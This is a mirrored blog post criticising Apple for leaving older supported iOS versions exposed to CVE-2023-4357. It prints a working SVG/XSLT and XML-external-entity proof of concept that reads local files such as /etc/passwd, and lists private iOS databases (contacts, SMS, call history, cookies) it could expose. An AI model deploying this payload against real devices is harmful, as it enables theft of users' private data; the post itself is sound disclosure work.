<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities">Original</a>
    <h1>No new iPhone? No secure iOS: Looking at an unfixed iOS vulnerability</h1>
    
    <div id="readability-page-1" class="page"><div>
      

      <div>
        

<article>
  <p>What’s the deal with iOS security updates, anyway?</p>

<p>Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, which and iOS 15.8 is still powering those devices, seemingly with official Apple support, with the latest update from <a href="https://support.apple.com/en-gb/109032">October the 25th, which addressed some security vulnerabilities</a>.</p>

<p>In reality, however, Apple seems to only be addressing <em>some</em> security issues in its older supported devices.</p>

<hr/>

<p>On June the 28th, Chromium announced that it had patched a vulnerability titled <a href="https://chromereleases.googleblog.com/2023/08/stable-channel-update-for-desktop_15.html">“CVE-2023-4357: Insufficient validation of untrusted input in XML”</a>. In the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1458911">bug report</a> for that issue, it was shown that on various devices, Google Chrome’s Blink rendering engine could reveal the contents of arbitrary files: <code>/etc/passwd</code>, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit.</p>

<hr/>

<p>Taking that exploit from June:</p>

<p><code>exploit.svg</code>:</p>
<div><div><pre><code><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span>&lt;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;?#&#34;?&gt;</span>
<span>&lt;xsl:stylesheet</span> <span>version=</span><span>&#34;1.0&#34;</span> <span>xmlns:xsl=</span><span>&#34;http://www.w3.org/1999/XSL/Transform&#34;</span><span>&gt;</span>

<span>&lt;xsl:template</span> <span>match=</span><span>&#34;/&#34;</span><span>&gt;</span>

<span>&lt;svg</span> <span>width=</span><span>&#34;1000%&#34;</span> <span>height=</span><span>&#34;1000%&#34;</span> <span>version=</span><span>&#34;1.1&#34;</span> <span>xmlns=</span><span>&#34;http://www.w3.org/2000/svg&#34;</span><span>&gt;</span>
<span>&lt;foreignObject</span> <span>class=</span><span>&#34;node&#34;</span> <span>font-size=</span><span>&#34;18&#34;</span> <span>width=</span><span>&#34;100%&#34;</span> <span>height=</span><span>&#34;100%&#34;</span><span>&gt;</span>
<span>&lt;body</span> <span>xmlns=</span><span>&#34;http://www.w3.org/1999/xhtml&#34;</span><span>&gt;</span>
<span>&lt;xmp&gt;&lt;xsl:copy-of</span> <span>select=</span><span>&#34;document(&#39;exploit.php&#39;)&#34;</span><span>/&gt;&lt;/xmp&gt;</span>
<span>&lt;/body&gt;</span>
<span>&lt;/foreignObject&gt;</span>
<span>&lt;/svg&gt;</span>

<span>&lt;/xsl:template&gt;</span>
<span>&lt;/xsl:stylesheet&gt;</span>
</code></pre></div></div>

<p><code>exploit.php</code>:</p>
<div><div><pre><code><span>&lt;?php</span> <span>header</span><span>(</span><span>&#34;Access-Control-Allow-Origin: *&#34;</span><span>);</span><span>?&gt;</span>
<span>&lt;!DOCTYPE p [
&lt;!ENTITY passwd SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>hosts</span> <span>SYSTEM</span> <span>&#34;</span><span>file:</span><span>///</span><span>etc</span><span>/</span><span>hosts</span><span>&#34;</span><span>&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>group</span> <span>SYSTEM</span> <span>&#34;</span><span>file:</span><span>//</span><span>localhost</span><span>/</span><span>etc</span><span>/</span><span>group</span><span>&#34;</span><span>&gt;</span>
]&gt;
<span>&lt;p&gt;</span>

<span>&lt;p</span> <span>style=</span><span>&#34;border-style: dotted;&#34;</span><span>&gt;</span>/etc/passwd:
<span>&amp;passwd;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>&#34;border-style: dotted;&#34;</span><span>&gt;</span>/etc/hosts:

<span>&amp;hosts;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>&#34;border-style: dotted;&#34;</span><span>&gt;</span>/etc/group:

<span>&amp;group;</span>
<span>&lt;/p&gt;</span>

<span>&lt;/p&gt;</span>
</code></pre></div></div>

<p>Aand trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit <em>still</em> works. When opening the page, your <code>/etc/passwd</code> is there for the world to see.</p>

<p>That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there’s always:</p>

<ul>
  <li>AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts.</li>
  <li>call_history.db: which contains all received, dialled, and missed calls of the user.</li>
  <li>SMS/call_history.db: which contains the SMS history of the user.</li>
</ul>

<p>Or maybe:</p>
<ul>
  <li>History.plist: which contains the browsing history of the user.</li>
  <li>Cookies.plist: which contains the browser’s cookies – including authentication cookies, which an attacker can re-use once they are stolen.</li>
</ul>

<hr/>

<p>After contacting Apple to see whether they intended to patch this, the response was quite short: <code>If in the future you are able to reproduce this issue using a different device that&#39;s running iOS 17 or later, please let us know.</code></p>

<p>This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state?</p>

<p>A <a href="https://github.com/skysafe/reblog/tree/main/cve-2023-45866">new exploit targeting the iOS</a> (among other OS’) Bluetooth stack has also been <a href="https://support.apple.com/en-us/HT214035">left unpatched by Apple in all versions except iOS 17</a>.</p>

<p>If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device.</p>

<hr/>

<p>Note: I haven’t tested this against older (supported) MacOS versions, but it’s definitely possible that Safari is exploitable here, too.</p>

</article>

  <p><span>
  Published on
  
  December
  16th,
  2023
  by
  
    Joshua Rogers
  
</span></p>




  




      </div>
      

    </div></div>
  </body>
</html>
